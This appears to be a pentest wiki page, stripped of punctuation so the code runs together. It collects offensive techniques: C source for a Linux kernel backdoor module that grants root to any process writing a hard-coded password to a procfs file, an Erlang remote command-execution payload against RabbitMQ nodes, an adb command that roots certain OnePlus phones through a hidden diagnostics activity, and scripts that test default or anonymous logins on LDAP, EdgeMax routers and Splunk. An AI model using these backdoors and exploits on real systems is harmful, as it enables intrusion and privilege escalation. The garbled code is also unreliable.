Should add check for anonymous login on FTP and null binding on LDAP in ExploitationTools NetworkExploitation portsnumbermd add a backdoor driver into kernelsource You can try to use other methods to backdoor the linux not driver Projectskernelbuildlinux zcat procconfiggz config Projectskernelbuildlinux ll driversbackdoor total K rwrr debug debug K Mar backdoorc rwrr debug debug Mar Kconfig rwrr debug debug Mar Makefile Projectskernelbuildlinux make AR driversbackdoorbuiltina Projectskernelbuildlinux ll driversbackdoor total K rwrr debug debug K Mar backdoorc rwrr debug debug Mar builtina rwrr debug debug Mar Kconfig rwrr debug debug Mar Makefile rwrr debug debug Mar modulesorder Projectskernelbuildlinux cat driversbackdoorMakefile objCONFIGBACKDOOR backdooro Projectskernelbuildlinux cat driversbackdoorKconfig config BACKDOOR tristate backdoor module depends on ARM help this is a backdoor module Projectskernelbuildlinux grep backdoor driversKconfig source driversbackdoorKconfig Projectskernelbuildlinux grep backdoor driversMakefile objy backdoor create a iso If you are a archer archiso is a good choice references Setup an env lab sudo aptget install rabbitmqserver sudo service rabbitmqserver start sudo rabbitmqctl q clusterstatus Elang executes os command oscmd runs command in sync mode openport in async mode erl ErlangOTP erts source bit smp ds asyncthreads kernelpollfalse Eshell V abort with G oscmdusrbinid uid debug gid hadoopgroup groups hadoopgroup adm cdrom sudo dip plugdev lpadmin sambashare n erlangopenportspawn binpwd tmptestfile line exitstatuseofstderrtostdout Port spawnfun P erlangopenportspawn binpwd stderrtostdout in exitstatus binarystream line receive P Data ioformatData pn Data end end How to exploit remote rabbitmq node erl sname test ErlangOTP erts source bit smp ds asyncthreads kernelpollfalse Eshell V abort with G testdebugx netkernelconnecttestdebugx true Payload Start erlangspawntestdebugx fun P erlangopenportspawn binpwd stderrtostdout in exitstatus binarystream line receive P Data ioformatData pn Data end end Payload End Data dataeolhomedebug initstop ok Reference img width altlinuxkernelbackdoor src include linuxmoduleh include linuxuaccessh include linuxprocfsh include linuxcredh include linuxslabh MODULELICENSEGPL MODULEAUTHORsecurity MODULEDESCRIPTIONJust for educational purpose define KERNPERMBITS permission bits procmodbdm define KERNPROCROOT mod define KERNPROCFILE bdm define KERNPASSWORD password static ssizet mymodulewritestruct file const char user sizet lofft static ssizet mymodulereadstruct file char user sizet lofft static int mymoduleopenstruct inode struct file static int mymoduleprocfsattachvoid static int init mymoduleinitvoid static void exit mymoduleexitvoid static struct procdirentry procroot static struct procdirentry procfile static const struct fileoperations procfops open mymoduleopen read mymoduleread write mymodulewrite static ssizet mymodulewritestruct file file const char user buffer sizet count lofft data struct cred cred char kbuf int ret if count return EINVAL kbuf kmalloccount GFPKERNEL if kbuf return ENOMEM ret copyfromuserkbuf buffer count if ret ifstrncmpKERNPASSWORDcharkbuf strlenKERNPASSWORD cred preparecreds if cred NULL creduid GLOBALROOTUID credgid GLOBALROOTGID credsuid GLOBALROOTUID credeuid GLOBALROOTUID credeuid GLOBALROOTUID credegid GLOBALROOTGID credfsuid GLOBALROOTUID credfsgid GLOBALROOTGID commitcredscred printkKERNWARNING Module is installed successfully n kfreekbuf return count static ssizet mymodulereadstruct file file char user buf sizet size lofft ppos return static int mymoduleopenstruct inode inode struct file file return static int mymoduleprocfsattachvoid procroot procmkdirKERNPROCROOT NULL procfile proccreateKERNPROCFILE KERNPERMBITS procroot procfops printkKERNINFO proccreate successfully n if ISERRprocfile printkKERNERR proccreate failed n return return static int init mymoduleinitvoid int ret printkKERNINFO module init n ret mymoduleprocfsattach ifret printkKERNINFO module init failed n return ret static void exit mymoduleexitvoid printkKERNINFO module exit n removeprocentryKERNPROCFILE procroot removeprocentryKERNPROCROOT NULL moduleinitmymoduleinit moduleexitmymoduleexit References usrbinpython coding utf pip install user pythonldap import ldap import ldapurl import logging import getpass loggingbasicConfiglevelloggingINFO log logginggetLoggerfile def ldaploginusername password host port urlschemeldap SSL ldapsexamplecom NOSSL ldapexamplecom status False try u ldapurlLDAPUrl urlschemeurlscheme hostportsd host intport l ldapinitializeuunparse perform a synchronous bind lsetoptionldapOPTREFERRALS you should set this to ldapVERSION if youre using a v directory lprotocolversion ldapVERSION Pass in a valid username and password to get privileged directory access If you leave them as empty strings or pass an invalid value you will still bind to the server but with limited privileges Any errors will throw an ldapLDAPError exception or related exception so you can ignore the result lsimplebindsusername password lunbind Return True if ldap allows anonymous binds status True If no exceptions login status is succeful except ldapLDAPError as e except Exception as e logexceptione handle error however you like if status loginfosd ss Login ldap successfully host intport username password else loginfosd ss Login ldap failed host intport username password return status if name main username inputUsername password getpassgetpass ldaphost Ldap Server IP ldaploginusername password ldaphost References usrbinpython coding utf Keywords EdgeMax EdgeOS Censys dork CNUBNT Router UI import requests import logging requestspackagesurllib disablewarnings requestspackagesurllib exceptionsInsecureRequestWarning loggingbasicConfiglevelloggingDEBUG log logginggetLoggerfile varwwwpythonedgeosguiviewspy def login def login Login view check username and password require accepting of EULA if it has not been accepted yet username requestPOSTgetusername password requestPOSTgetpassword response authusername password success responsegetsuccess session requestenviron beakersession if success session error None eulapending ubntiseulapending eulaaccepted requestPOSTgetaccepteula on if eulapending and not eulaaccepted session error Please accept the Terms of Use else if eulaaccepted ubntaccepteula sessionregenerateid session authenticated True session ip requestenvirongetREMOTEADDR session username username session level responsegetlevel session started responsegetstarted session features responsegetplatform session model responsegetplatform getmodel Redirect back to and set session cookie res bottleresponsecopyclsHTTPResponse resstatus resbody ressetheaderLocation urljoinrequesturl ressetcookieXCSRFTOKEN csrfgeneratecsrftoken ressetcookiePHPSESSID sessionid TODO PHPSESSID srsly raise res else session error responsegeterror Unexpected error during authentication redirect def edgemaxloginhost port usernameubnt passwordubnt timeout Read more from GET HTTP Host UserAgent Mozilla Gecko Firefox Accept texthtmlapplicationxhtmlxmlapplicationxmlq q AcceptLanguage enUSenq AcceptEncoding gzip deflate Connection close UpgradeInsecureRequests CacheControl maxage HTTP OK XFrameOptions SAMEORIGIN XXssProtection modeblock ContentLength XContentTypeOptions nosniff ContentType texthtml charsetUTF Setcookie beakersessionid ae e a beda ec f fe a a c httponly Path secure Connection close Date Thu Mar GMT Server Server scheme https if port else http url schemehostportformat schemescheme hosthost portport headers UserAgent Mozilla Gecko Firefox httpcli requestsSession request beakersessionid from edge router logdebugsend st http request for beakersessionid response requestsget url verifyFalse headersheaders allowredirectsFalse timeouttimeout beakersessionid responsecookiesgetbeakersessionid if not beakersessionid return False POST HTTP Host UserAgent Mozilla Gecko Firefox Accept texthtmlapplicationxhtmlxmlapplicationxmlq q AcceptLanguage enUSenq AcceptEncoding gzip deflate Referer ContentType applicationxwwwformurlencoded ContentLength Cookie beakersessionid ae e a beda ec f fe a a c Connection close UpgradeInsecureRequests usernameubnt passwordubnt HTTP See Other ContentLength Location ContentType texthtml charsetUTF SetCookie PHPSESSID ada f a a efbd e SetCookie XCSRFTOKENc ff d c b ffb fbe ea f acd aaeabbebf dc SetCookie beakersessionid ada f a a efbd e httponly Path secure Connection close Date Thu Mar GMT Server Server login with usernamepassword and beakersessionid headers UserAgent Mozilla Gecko Firefox Cookie beakersessionids beakersessionid logdebugsend nd http request to login EdgeMax with creds response requestspost url verifyFalse headersheaders timeouttimeout allowredirectsFalse datausername username password password cookieauthenticatedflag all in responsecookies for in PHPSESSID XCSRFTOKEN beakersessionid status responsestatuscode and cookieauthenticatedflag if status loginfoLogin ss ss successfully host port username password else loginfoLogin ss ss failed host port username password return status if name main import sys if lensysargv printpython s host port sysargv sysexit host sysargv port intsysargv edgemaxloginhost port References python edgemaxloginpy DEBUGedgemaxloginpysend st http request for beakersessionid DEBUGurllib connectionpoolStarting new HTTPS connection DEBUGurllib connectionpool GET HTTP DEBUGedgemaxloginpysend nd http request to login EdgeMax with creds DEBUGurllib connectionpoolStarting new HTTPS connection DEBUGurllib connectionpool POST HTTP INFOedgemaxloginpyLogin ubntubnt successfully usrbinpython coding utf pip install user splunksdk import splunklibbinding as binding import logging loggingbasicConfiglevelloggingINFO log logginggetLoggerfile def splunkloginhost port username password Login Splunk based on API loginstatus False try service bindingconnect hosthost portport usernameusername passwordpassword loginstatus True loginfoAttempting sd Login successfully host port except bindingAuthenticationError as e loginfoAttempting sd s host port emessage return loginstatus if name main host splunklabexamplecom port username username password password splunkloginhost port username password python splunkloginpy INFOsplunkloginpyAttempting splunklabexamplecom Login failed python splunkloginpy INFOsplunkloginpyAttempting splunklabexamplecom Login successfully Download Windows Kernel Exploitationpdf If you like please add a reference url for pentestwiki img width altwindows kernel exploitation src References Tested on ONEPLUS A adb shell getprop robuildversionrelease adb shell pm list packages f adb pull systemappEngineeringMode EngineeringModeapk cd EngineeringModeapk apktool d EngineeringModeapk grep Ri comandroidengineeringmode EngineeringModeAndroidManifestxml activity androidconfigChangeskeyboardHiddenorientation androidnamequalcommQualCommNvShow activity androidconfigChangeskeyboardHiddenorientation androidexcludeFromRecentstrue androidnamequalcommDiagEnabled androidscreenOrientationportrait intentfilter action androidnamecomandroidengineeringmodequalcommDiagEnabled category androidnameandroidintentcategoryDEFAULT intentfilter activity adb shell am start n comandroidengineeringmodequalcommDiagEnabled es code angela Starting Intent cmpcomandroidengineeringmodequalcommDiagEnabled has extras adb shell id uid root gid root groups root input log adb sdcardrw sdcardr netbtadmin netbt inet netbwstats readproc contextursus img width altscreen shot at src default creds guestguest Try to access with your browser and login with the creds If it is on please disable it with the following method rabbitmqplugins disable rabbitmqmanagement The following plugins have been disabled rabbitmqmanagementvisualiser cowlib cowboy rabbitmqwebdispatch rabbitmqmanagementagent rabbitmqmanagement Applying plugin configuration to rabbitlocalhost stopped plugins 